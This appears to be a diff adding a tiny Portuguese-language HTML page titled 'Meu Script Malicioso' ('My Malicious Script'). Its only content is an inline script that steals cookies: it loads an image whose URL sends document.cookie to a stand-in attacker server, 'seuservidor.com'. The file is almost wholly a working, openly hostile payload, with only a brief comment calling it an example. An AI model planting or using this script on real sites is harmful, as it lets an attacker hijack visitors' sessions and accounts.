@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Meu Script Malicioso</title>
+</head>
+<body>
+    <script>
+        // Exemplo: Captura de cookies
+        var img = new Image();
+        img.src = 'http://seuservidor.com/capture?cookie=' + document.cookie;
+    </script>
+</body>
+</html>
